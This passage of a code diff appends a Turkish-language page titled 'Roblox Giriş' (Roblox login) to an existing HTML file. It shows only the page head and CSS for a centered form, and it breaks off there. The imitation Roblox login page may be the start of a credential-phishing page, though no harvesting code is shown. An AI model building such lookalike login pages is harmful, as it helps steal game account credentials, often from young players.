@@ -43,3 +43,31 @@ Roblox
   </p>
 </body>
 </html>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Roblox Giriş</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(180deg, #0b0b0c, #1a1a1c);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+    h1 {
+      font-size: 28px;
+      margin-bottom: 20px;
+    }
+    form {
+      background: #1e1f22;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px
